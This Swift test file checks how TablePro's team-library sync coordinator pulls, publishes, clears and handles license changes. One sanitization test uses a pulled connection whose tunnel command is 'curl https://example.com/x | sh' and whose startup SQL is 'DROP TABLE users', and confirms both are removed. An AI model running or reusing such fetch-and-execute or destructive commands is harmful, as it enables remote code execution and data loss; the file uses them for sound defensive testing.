import Combine
import Foundation
@testable import TablePro
import TableProImport
import TableProTestSupport
import Testing

extension GlobalStateSuites {
    // Every case reads or resets TeamLibraryMetadataStorage in the shared defaults suite.
    @MainActor
    struct TeamLibrarySyncCoordinatorTests {
        private func makeCoordinator(
            client: TeamLibraryAPIClient,
            available: Bool = true
        ) -> TeamLibrarySyncCoordinator {
            let url = FileManager.default.temporaryDirectory.appendingPathComponent("team_library_\(UUID().uuidString).json")
            return TeamLibrarySyncCoordinator(
                apiClient: client,
                store: TeamLibraryStore(fileURL: url),
                isFeatureAvailable: { available },
                credentialsProvider: { ("AAAAA-BBBBB-CCCCC-DDDDD-EEEEE", String(repeating: "a", count: 64)) }
            )
        }

        nonisolated private static func response(queries names: [String]) -> TeamLibraryPullResponse {
            TeamLibraryPullResponse(
                connections: [],
                queryFolders: [],
                queries: names.map {
                    .init(
                        clientId: UUID().uuidString, folderClientId: nil, connectionClientId: nil,
                        name: $0, query: "select 1", keyword: nil, sortOrder: 0, publishedBy: "a@b.com"
                    )
                },
                fetchedAt: "now"
            )
        }

        @Test("pull loads the response into the observable library")
        func pullUpdatesLibrary() async {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let mock = MockTeamLibraryAPIClient()
            mock.pullResponse = Self.response(queries: ["Q"])
            let coordinator = makeCoordinator(client: mock)

            await coordinator.pull()

            #expect(coordinator.library.queries.count == 1)
            #expect(mock.pullCallCount == 1)
            #expect(coordinator.lastRefreshedAt != nil)
            #expect(coordinator.lastPullError == nil)
        }

        @Test("pull does nothing when the feature is unavailable")
        func pullSkipsWhenUnavailable() async {
            let mock = MockTeamLibraryAPIClient()
            let coordinator = makeCoordinator(client: mock, available: false)

            await coordinator.pull()

            #expect(mock.pullCallCount == 0)
        }

        @Test("pullIfNeeded skips when a pull is not yet due")
        func pullIfNeededRespectsInterval() async {
            TeamLibraryMetadataStorage.recordPull()
            defer { TeamLibraryMetadataStorage.reset() }
            let mock = MockTeamLibraryAPIClient()
            let coordinator = makeCoordinator(client: mock)

            await coordinator.pullIfNeeded()

            #expect(mock.pullCallCount == 0)
        }

        @Test("A failed pull keeps the library it had and publishes the reason")
        func failedPullKeepsLibrary() async {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let mock = MockTeamLibraryAPIClient()
            mock.pullResponse = Self.response(queries: ["Q"])
            let coordinator = makeCoordinator(client: mock)
            await coordinator.pull()
            let refreshedAt = coordinator.lastRefreshedAt

            let failure = URLError(.notConnectedToInternet)
            mock.pullError = failure
            await coordinator.pull()

            #expect(coordinator.library.queries.map(\.name) == ["Q"])
            #expect(coordinator.lastPullError == failure.localizedDescription)
            #expect(coordinator.lastRefreshedAt == refreshedAt)

            mock.pullError = nil
            await coordinator.pull()
            #expect(coordinator.lastPullError == nil)
        }

        @Test("Pulls that overlap share one request")
        func overlappingPullsShareOneRequest() async throws {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let client = GatedTeamLibraryClient { _ in Self.response(queries: ["Q"]) }
            let coordinator = makeCoordinator(client: client)

            let first = Task { await coordinator.pull() }
            await client.pullGate.arrived(1)
            #expect(coordinator.isPulling)
            let second = Task { await coordinator.pull() }
            coordinator.refresh()
            await client.pullGate.open()
            await first.value
            await second.value
            try await waitUntil { !coordinator.isPulling }

            #expect(client.pullCount == 1)
            #expect(coordinator.library.queries.map(\.name) == ["Q"])
        }

        @Test("A license change during a pending pull drops the old team's response and pulls the new team's")
        func licenseChangeDropsThePendingPull() async throws {
            // Not due, so `start()` only subscribes to license changes and pulls nothing itself.
            TeamLibraryMetadataStorage.recordPull()
            defer { TeamLibraryMetadataStorage.reset() }
            let client = GatedTeamLibraryClient { Self.response(queries: [$0]) }
            let license = LicenseKeyBox(key: "team-a")
            let licenseChanges = PassthroughSubject<Void, Never>()
            let store = TeamLibraryStore(fileURL: FileManager.default.temporaryDirectory
                .appendingPathComponent("team_library_\(UUID().uuidString).json"))
            let coordinator = TeamLibrarySyncCoordinator(
                apiClient: client,
                store: store,
                isFeatureAvailable: { true },
                credentialsProvider: { (license.key, String(repeating: "a", count: 64)) },
                licenseStatusChanges: licenseChanges.eraseToAnyPublisher()
            )
            coordinator.start()

            let teamA = Task { await coordinator.pull() }
            await client.pullGate.arrived(1)
            license.key = "team-b"
            licenseChanges.send()
            try await waitUntil { client.pullCount == 2 }
            await client.pullGate.open()
            await teamA.value
            try await waitUntil { !coordinator.isPulling && !coordinator.library.queries.isEmpty }

            #expect(client.pulledKeys == ["team-a", "team-b"])
            #expect(coordinator.library.queries.map(\.name) == ["team-b"])
            #expect(await store.load()?.queries.map(\.name) == ["team-b"])
        }

        @Test("A clear during a pending pull stays cleared when the response arrives")
        func clearDropsThePendingPull() async throws {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let client = GatedTeamLibraryClient { Self.response(queries: [$0]) }
            let store = TeamLibraryStore(fileURL: FileManager.default.temporaryDirectory
                .appendingPathComponent("team_library_\(UUID().uuidString).json"))
            let coordinator = TeamLibrarySyncCoordinator(
                apiClient: client,
                store: store,
                isFeatureAvailable: { true },
                credentialsProvider: { ("team-a", String(repeating: "a", count: 64)) }
            )

            let pending = Task { await coordinator.pull() }
            await client.pullGate.arrived(1)
            await coordinator.clear()
            await client.pullGate.open()
            await pending.value

            #expect(coordinator.library.queries.isEmpty)
            #expect(await store.load()?.queries.isEmpty ?? true)
            #expect(TeamLibraryMetadataStorage.lastPullAt == nil)
            #expect(coordinator.lastRefreshedAt == nil)
            #expect(!coordinator.isPulling)
        }

        @Test("The library a pull publishes is the sanitized copy, without tunnel command or startup SQL")
        func pulledLibraryIsSanitized() async throws {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let payload = ExportableConnection(
                name: "Prod", host: "db", port: 5_432, database: "app", username: "deploy", type: "PostgreSQL",
                startupCommands: "DROP TABLE users",
                tunnelCommand: ExportableTunnelCommand(
                    method: "custom", command: "curl https://example.com/x | sh", executablePath: nil,
                    kubernetesNamespace: nil, kubernetesResource: nil, kubernetesContext: nil,
                    awsTarget: nil, awsProfile: nil, awsRegion: nil
                )
            )
            let mock = MockTeamLibraryAPIClient()
            mock.pullResponse = TeamLibraryPullResponse(
                connections: [.init(id: "01A", sourceConnectionId: nil, payload: payload, publishedBy: nil, publishedAt: nil)],
                queryFolders: [],
                queries: [],
                fetchedAt: "now"
            )
            let coordinator = makeCoordinator(client: mock)

            await coordinator.pull()

            let pulled = try #require(coordinator.library.connections.first)
            #expect(pulled.payload.startupCommands == nil)
            #expect(pulled.payload.tunnelCommand == nil)
        }

        @Test("A second publish while one is running is refused")
        func publishRefusesReentry() async throws {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let client = GatedTeamLibraryClient { _ in .empty }
            let coordinator = makeCoordinator(client: client)

            let first = Task { try await coordinator.publish(connections: [], favorites: [], folders: []) }
            await client.publishGate.arrived(1)
            #expect(coordinator.isPublishing)

            await #expect(throws: TeamLibraryPublishError.alreadyPublishing) {
                _ = try await coordinator.publish(connections: [], favorites: [], folders: [])
            }
            await client.publishGate.open()
            await client.pullGate.open()
            _ = try await first.value

            #expect(client.publishCount == 1)
            #expect(!coordinator.isPublishing)
        }

        @Test("A license that turns the team library on mid-session pulls it once")
        func licenseActivationPullsLibrary() async throws {
            TeamLibraryMetadataStorage.recordPull()
            defer { TeamLibraryMetadataStorage.reset() }
            let mock = MockTeamLibraryAPIClient()
            mock.pullResponse = Self.response(queries: ["Q"])
            let availability = FeatureAvailability()
            let licenseChanges = PassthroughSubject<Void, Never>()
            let coordinator = TeamLibrarySyncCoordinator(
                apiClient: mock,
                store: TeamLibraryStore(fileURL: FileManager.default.temporaryDirectory
                    .appendingPathComponent("team_library_\(UUID().uuidString).json")),
                isFeatureAvailable: { availability.isAvailable },
                credentialsProvider: { ("AAAAA-BBBBB-CCCCC-DDDDD-EEEEE", String(repeating: "a", count: 64)) },
                licenseStatusChanges: licenseChanges.eraseToAnyPublisher()
            )

            coordinator.start()
            licenseChanges.send()
            availability.isAvailable = true
            licenseChanges.send()
            licenseChanges.send()
            try await waitUntil { coordinator.library.queries.count == 1 }
            // Each license change that starts a pull queues it on the main actor while `send()` runs,
            // and the mock client answers before the pull first suspends. Every pull those sends
            // started has called the client once this block runs.
            await withCheckedContinuation { continuation in
                DispatchQueue.main.async { continuation.resume() }
            }

            #expect(coordinator.library.queries.map(\.name) == ["Q"])
            #expect(mock.pullCallCount == 1)
        }

        @Test("publish sends the mapped saved queries and then refreshes")
        func publishSendsQueries() async throws {
            TeamLibraryMetadataStorage.reset()
            defer { TeamLibraryMetadataStorage.reset() }
            let mock = MockTeamLibraryAPIClient()
            let coordinator = makeCoordinator(client: mock)
            let favorite = SQLFavorite(
                id: UUID(),
                name: "Recent",
                query: "select 1",
                keyword: nil,
                folderId: nil,
                connectionId: nil,
                sortOrder: 0,
                createdAt: Date(),
                updatedAt: Date()
            )

            _ = try await coordinator.publish(connections: [], favorites: [favorite], folders: [])

            #expect(mock.publishedRequests.count == 1)
            #expect(mock.publishedRequests[0].queries.count == 1)
            #expect(mock.publishedRequests[0].queries[0].name == "Recent")
            #expect(mock.pullCallCount == 1)
        }
    }
}

@MainActor
private final class FeatureAvailability {
    var isAvailable = false
}

@MainActor
private final class LicenseKeyBox {
    var key: String

    init(key: String) {
        self.key = key
    }
}

private final class GatedTeamLibraryClient: TeamLibraryAPIClient, @unchecked Sendable {
    let pullGate = AsyncGate()
    let publishGate = AsyncGate()
    private let respond: @Sendable (String) -> TeamLibraryPullResponse
    private let lock = NSLock()
    private var keys: [String] = []
    private var publishes = 0

    init(respond: @escaping @Sendable (_ licenseKey: String) -> TeamLibraryPullResponse) {
        self.respond = respond
    }

    var pullCount: Int { lock.withLock { keys.count } }
    var pulledKeys: [String] { lock.withLock { keys } }
    var publishCount: Int { lock.withLock { publishes } }

    func pull(licenseKey: String, machineId: String) async throws -> TeamLibraryPullResponse {
        lock.withLock { keys.append(licenseKey) }
        await pullGate.wait()
        return respond(licenseKey)
    }

    func publish(_ request: TeamLibraryPublishRequest) async throws -> TeamLibraryPublishResponse {
        lock.withLock { publishes += 1 }
        await publishGate.wait()
        return TeamLibraryPublishResponse(publishedAt: "", connectionCount: 0, queryCount: 0)
    }

    func deleteConnection(id: String, licenseKey: String, machineId: String) async throws {}

    func deleteQuery(clientId: String, licenseKey: String, machineId: String) async throws {}

    func deleteQueryFolder(clientId: String, licenseKey: String, machineId: String) async throws {}
}
